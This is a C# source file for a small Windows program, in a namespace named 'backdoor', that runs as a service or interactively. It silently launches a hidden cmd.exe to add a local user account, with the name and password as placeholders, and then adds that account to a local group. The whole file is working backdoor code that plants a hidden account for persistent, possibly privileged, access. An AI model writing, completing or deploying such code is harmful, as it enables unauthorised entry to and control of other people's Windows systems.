using System;
using System.Collections.Generic;
using System.Linq;
using System.ServiceProcess;
using System.Text;

namespace backdoor
{
    static class Program
    {
        public static void CriaBackDoor()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c net user <u> <p> /add && timeout /t 2 && net localgroup <g> <u> /add";
            process.StartInfo = startInfo;
            process.Start();
        }
        static void Main(string[] args)
        {
            if (!Environment.UserInteractive)
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Service1()
                };
                ServiceBase.Run(ServicesToRun);
            }
            else
            {
                CriaBackDoor();
            }
        }
    }
    public partial class Service1 : ServiceBase
    {
        private System.ComponentModel.IContainer components = null;

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            this.ServiceName = "Service1";
        }
        public Service1()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            Program.CriaBackDoor();
            Environment.Exit(1);
        }
        protected override void OnStop()
        {
        }
    }
}
